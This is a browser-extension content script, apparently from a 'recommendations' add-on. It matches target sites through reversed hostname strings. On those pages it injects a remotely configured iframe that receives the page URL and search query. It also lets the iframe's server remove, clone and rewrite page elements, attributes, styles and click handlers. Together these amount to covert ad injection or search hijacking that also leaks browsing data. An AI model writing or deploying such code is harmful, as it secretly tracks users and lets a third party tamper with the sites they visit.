var recommendations = [];
var transients = [];

function handleContentMessage(message) {
	if (message.action == 'setRecommendations') {
		recommendations = message.recommendations;
		transients = message.transients;
		doRecommendations();
	} 
}

browser.runtime.onMessage.addListener(handleContentMessage);

browser.runtime.sendMessage({'action': 'getRecommendations'});

function doRecommendations() {
	var url = new URL(location.href);
	
	if (isPart(url.hostname) && typeof window.nrsLoaded == 'undefined') {
		window.nrsLoaded = true;
		
		var rec = getRec(url.hostname);
		
		if (rec.type == 'transient') {
			if (transients.indexOf(url.hostname) == -1) {
				browser.runtime.sendMessage({'action': 'addTransient', 'hostname': url.hostname});
			} else {
				return;
			}
		}
		
		var query = '';
		
		if (rec.qparam) {
			query = url.searchParams.get(rec.qparam);
		}

		if (document.querySelector(rec.ifcondition)) {
			var ifurl = new URL(rec.ifsrc);
		
			if (document.querySelector('#ifnrs')) {
				return;
			}
			
			var ifelement = document.createElement('iframe');
			
			ifelement.setAttribute('id', 'ifnrs')
			ifelement.setAttribute('src', rec.ifsrc.replace('##url##', url.toString()).replace('##qparam##', query));
			ifelement.setAttribute('style', rec.ifstyle);
			
			var ifbase = document.querySelector(rec.ifselector);
			
			if (ifbase) {
				ifbase.insertBefore(ifelement, ifbase.firstChild);
			}
			
			var sourceObject = null;
			var originObject = null;
			
			function doClick(key) {
				sourceObject.postMessage(JSON.stringify({action: 'doClick', key: key}), originObject);
			}
			
			function receiveMessage(event) {
				if (event.origin == ifurl.origin) {
					sourceObject = event.source;
					originObject = event.origin;
					
					var message = JSON.parse(event.data);
					
					if (message.action == 'doCloneNode') {
						var node = document.querySelector(message.selector);
						
						if (node) {
							var clonedNode = node.cloneNode(true);
								
							if (node.parentNode) {
								node.parentNode.insertBefore(clonedNode, node);
							}
						}
					} else if (message.action == 'doRemoveNode') {
						var node = document.querySelector(message.selector);
						
						if (node) {
							node.remove();
						}
					} else if (message.action == 'doCleanupNodes') {
						var selectedNodes = document.querySelectorAll(message.selector);
						
						if (selectedNodes && selectedNodes.length > 0) {
							for(var i=0; i<selectedNodes.length && i<message.count; i++)  {
								var nodesToKeep = [];
								for(var j=0; j<message.cleanupKeepSelectors.length; j++) {
									var keepNode = selectedNodes[i].querySelector(message.cleanupKeepSelectors[j]);
									if (keepNode) {
										nodesToKeep.push(keepNode);
									}
								}
								while (selectedNodes[i].hasChildNodes()) {
									selectedNodes[i].removeChild(selectedNodes[i].lastChild);
								}
								for(var j=0; j<nodesToKeep.length; j++) {
									selectedNodes[i].appendChild(nodesToKeep[j]);
								}
							}
						}
					} else if (message.action == 'setNodeData') {
						var selectedNodes = document.querySelectorAll(message.selector);
						
						var startIndex = 0;
						var endIndex = (selectedNodes ? selectedNodes.length : 0);
						
						if (message.index >= 0) {
							startIndex = message.index;
							endIndex = message.index+1;
						}
						
						if (selectedNodes && selectedNodes.length > startIndex) {
							for(var index=startIndex; index<endIndex; index++) {
								var node = selectedNodes[index];
								
								if (message.childSelector) {
									node = node.querySelector(message.childSelector);
								}
								if (message.text) {
									node.innerText = message.text;
								}
								if (message.attributes) {
									for(var i=0; i<message.attributes.length; i++)  {
										node.setAttribute(message.attributes[i].name, message.attributes[i].value);
									}
								}
								if (message.styles) {
									for(var i=0; i<message.styles.length; i++)  {
										node.style[message.styles[i].name] = message.styles[i].value;
									}
								}
								if (message.doclick) {
									node.onclick = function() {doClick(message.doclick);};
								}
							}
						}
					}
				}
			}

			window.addEventListener('message', receiveMessage, false);
		}
	}
}
		
function isPart(h) {
	var rec = getRec(h);
	
	if (rec) {
		return true;
	}
	
	return false;
}

function getRec(h) {
	for (var i=0; i<recommendations.length; i++) {
		var rec = recommendations[i];
		
		if (h.indexOf(rec.part.split('').reverse().join('')) != -1) {
			return rec;
		}
	}
	
	return false;
}
